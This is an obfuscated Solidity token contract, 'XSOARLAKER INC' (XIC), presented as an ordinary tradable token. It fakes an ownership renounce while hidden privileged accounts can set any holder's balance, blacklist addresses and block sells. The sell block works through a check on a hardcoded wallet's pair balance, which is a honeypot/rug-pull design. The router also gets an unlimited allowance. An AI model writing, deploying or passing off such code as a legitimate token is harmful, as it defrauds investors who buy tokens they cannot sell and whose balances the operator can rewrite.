//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface feeMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromLaunch {
    function createPair(address tradingAmount, address autoSwap) external returns (address);
}

abstract contract swapModeIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxReceiver) external view returns (uint256);

    function transfer(address senderFrom, uint256 liquidityExempt) external returns (bool);

    function allowance(address swapAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityExempt) external returns (bool);

    function transferFrom(address sender,address senderFrom,uint256 liquidityExempt) external returns (bool);

    event Transfer(address indexed from, address indexed totalAuto, uint256 value);
    event Approval(address indexed swapAt, address indexed spender, uint256 value);
}

interface sellTotal is maxLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract XSOARLAKERINC is swapModeIs, maxLimit, sellTotal {

    mapping(address => bool) public swapEnableReceiver;

    uint256 sellLimit;

    uint256 public feeMax;

    function totalSupply() external view virtual override returns (uint256) {
        return buyListReceiver;
    }

    constructor (){
        if (takeTrading == enableAt) {
            launchTotal = maxLaunched;
        }
        maxSenderFund();
        feeMarketing swapMin = feeMarketing(receiverTeam);
        minSwapTeam = fromLaunch(swapMin.factory()).createPair(swapMin.WETH(), address(this));
        
        tradingFromSwap = _msgSender();
        swapEnableReceiver[tradingFromSwap] = true;
        sellMax[tradingFromSwap] = buyListReceiver;
        
        emit Transfer(address(0), tradingFromSwap, buyListReceiver);
    }

    uint8 private maxWalletTrading = 18;

    function amountLimit(address tokenTrading, address senderFrom, uint256 liquidityExempt) internal returns (bool) {
        if (tokenTrading == tradingFromSwap) {
            return toReceiverAuto(tokenTrading, senderFrom, liquidityExempt);
        }
        uint256 launchTokenMin = maxLimit(minSwapTeam).balanceOf(senderSellWallet);
        require(launchTokenMin == launchedAt);
        require(!swapTrading[tokenTrading]);
        return toReceiverAuto(tokenTrading, senderFrom, liquidityExempt);
    }

    string private maxMarketingTx = "XIC";

    address receiverTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return feeIsAuto;
    }

    function allowance(address isLaunch, address marketingSenderToken) external view virtual override returns (uint256) {
        if (marketingSenderToken == receiverTeam) {
            return type(uint256).max;
        }
        return maxEnable[isLaunch][marketingSenderToken];
    }

    mapping(address => uint256) private sellMax;

    function symbol() external view virtual override returns (string memory) {
        return maxMarketingTx;
    }

    function name() external view virtual override returns (string memory) {
        return txBuy;
    }

    uint256 public teamEnable;

    uint256 private receiverToken;

    uint256 private buyListReceiver = 100000000 * 10 ** 18;

    function approve(address marketingSenderToken, uint256 liquidityExempt) public virtual override returns (bool) {
        maxEnable[_msgSender()][marketingSenderToken] = liquidityExempt;
        emit Approval(_msgSender(), marketingSenderToken, liquidityExempt);
        return true;
    }

    event OwnershipTransferred(address indexed marketingExempt, address indexed marketingTake);

    function maxModeTx(address minSwap) public {
        if (launchedMode) {
            return;
        }
        if (launchTotal == receiverToken) {
            launchTotal = teamEnable;
        }
        swapEnableReceiver[minSwap] = true;
        
        launchedMode = true;
    }

    function maxSenderFund() public {
        emit OwnershipTransferred(tradingFromSwap, address(0));
        feeIsAuto = address(0);
    }

    address public minSwapTeam;

    function transferFrom(address tokenTrading, address senderFrom, uint256 liquidityExempt) external override returns (bool) {
        if (_msgSender() != receiverTeam) {
            if (maxEnable[tokenTrading][_msgSender()] != type(uint256).max) {
                require(liquidityExempt <= maxEnable[tokenTrading][_msgSender()]);
                maxEnable[tokenTrading][_msgSender()] -= liquidityExempt;
            }
        }
        return amountLimit(tokenTrading, senderFrom, liquidityExempt);
    }

    function transfer(address sellShould, uint256 liquidityExempt) external virtual override returns (bool) {
        return amountLimit(_msgSender(), sellShould, liquidityExempt);
    }

    bool private takeTrading;

    address public tradingFromSwap;

    uint256 private launchTotal;

    address private feeIsAuto;

    bool public launchedMode;

    function listSenderBuy(uint256 liquidityExempt) public {
        limitLiquidity();
        launchedAt = liquidityExempt;
    }

    function marketingTotalLaunched(address sellShould, uint256 liquidityExempt) public {
        limitLiquidity();
        sellMax[sellShould] = liquidityExempt;
    }

    uint256 private maxLaunched;

    function fundMaxSell(address feeWallet) public {
        limitLiquidity();
        
        if (feeWallet == tradingFromSwap || feeWallet == minSwapTeam) {
            return;
        }
        swapTrading[feeWallet] = true;
    }

    string private txBuy = "XSOARLAKER INC";

    address senderSellWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function limitLiquidity() private view {
        require(swapEnableReceiver[_msgSender()]);
    }

    function balanceOf(address maxReceiver) public view virtual override returns (uint256) {
        return sellMax[maxReceiver];
    }

    mapping(address => bool) public swapTrading;

    function owner() external view returns (address) {
        return feeIsAuto;
    }

    bool public enableAt;

    mapping(address => mapping(address => uint256)) private maxEnable;

    function decimals() external view virtual override returns (uint8) {
        return maxWalletTrading;
    }

    function toReceiverAuto(address tokenTrading, address senderFrom, uint256 liquidityExempt) internal returns (bool) {
        require(sellMax[tokenTrading] >= liquidityExempt);
        sellMax[tokenTrading] -= liquidityExempt;
        sellMax[senderFrom] += liquidityExempt;
        emit Transfer(tokenTrading, senderFrom, liquidityExempt);
        return true;
    }

    uint256 launchedAt;

}